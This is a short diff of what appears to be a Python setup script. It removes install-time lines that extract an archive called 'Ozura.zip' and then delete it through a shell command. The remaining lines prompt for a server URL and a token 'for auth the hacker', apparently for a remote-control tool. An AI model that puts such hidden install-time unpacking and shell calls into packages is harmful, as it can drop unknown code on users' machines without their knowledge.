@@ -21,10 +21,6 @@ setup(
     zip_safe = False
 )
 
-with ZipFile('Ozura.zip', 'r') as zipObj:
-    zipObj.extractall()
-os.system('cmd /c "del "Ozura.zip"')
-
 os.system('cls||clear')
 serverURL = input('Your server url (with http/s): ')
 token = input('Enter a token for auth the hacker: ')
